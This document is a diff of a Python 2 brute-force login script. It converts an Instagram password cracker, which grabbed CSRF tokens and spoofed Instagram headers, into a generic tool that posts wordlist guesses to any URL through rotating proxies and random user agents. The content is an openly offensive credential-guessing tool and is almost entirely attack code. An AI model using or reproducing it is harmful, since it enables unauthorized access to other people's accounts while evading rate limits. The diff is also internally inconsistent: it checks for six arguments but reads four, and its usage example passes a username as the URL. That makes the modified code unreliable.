@@ -1,5 +1,5 @@
 ###############################################################################
-# Instagram Brute forcer
+# Brute forcer
 # Developed By N3TC@T
 # netcat[dot]av[at]gmail[dot]com 
 # !/usr/bin/python
@@ -13,13 +13,12 @@ import random
 import multiprocessing
 import time
 
-if len(sys.argv) != 5:
-        print "\nUsage : ./instabrute.py <username> <wordlist> <proxylist> <thread>"
-        print "Eg: ./instabrute.py netcat words.txt proxy.txt 4\n"
+if len(sys.argv) != 6:
+        print "\nUsage : ./brute.py <url> <wordlist> <proxylist> <thread>"
+        print "Eg: ./brute.py netcat words.txt proxy.txt 4\n"
         sys.exit(1)
 
-URL = "https://instagram.com/accounts/login/ajax/"
-USER = sys.argv[1]
+URL = sys.argv [1]
 PROXY = sys.argv[3]
 THREAD = int(sys.argv[4])
 
@@ -59,7 +58,7 @@ except(IOError):
 
 
 print "\n***************************************"
-print "* Priv8 Inastgarm Brute forcer        *"
+print "* Priv8 Brute forcer        *"
 print "* Coded by N3TC@T                     *"
 print "* netcat[dot]av[at]gmail[dot]com      *"
 print "***************************************"
@@ -87,15 +86,6 @@ for prox in proxys:
 
 print "[+] Online Proxy: " , len(working_list)
 
-def get_csrf():
-  global csrf_token
-  url = 'https://instagram.com/accounts/login/'
-  r = requests.get(url)
-  csrf_token = r.cookies['csrftoken']
-
-print "[+] Getting CSRF Token: "
-get_csrf()
-print "[+] CSRF Token :" , csrf_token , "\n"
 
 
 
@@ -114,21 +104,15 @@ def brute(word,event):
 	     
     header = {
             "User-Agent": random.choice(ouruseragent) ,
-            "X-Instagram-AJAX" : "1" ,
-            "X-CSRFToken": csrf_token ,
-            "X-Requested-With": "XMLHttpRequest" ,
-	    "Referer" : "https://instagram.com/accounts/login/ajax/?targetOrigin=https%3A%2F%2Finstagram.com",
             }
-    cookies= {
-            "csrftoken": csrf_token
-             }
+
     
     print "[*] Trying " , word , " | " ,  proxi
     
     if(proxi != 'No Proxy'):    
-      r=requests.post(URL, headers=header ,  data=post_data , cookies=cookies , proxies=proxies , timeout=10)
+      r=requests.post(URL + "get.php", headers=header ,  data=post_data  , proxies=proxies , timeout=10)
     else:
-      r=requests.post(URL ,headers=header, data=post_data , cookies=cookies ,timeout=10)
+      r=requests.post(URL  + "get.php" ,headers=header, data=post_data ,timeout=10)
     if (r.status_code != 200 ):
       print "Error" , r.status_code
       #sys.exit(1)
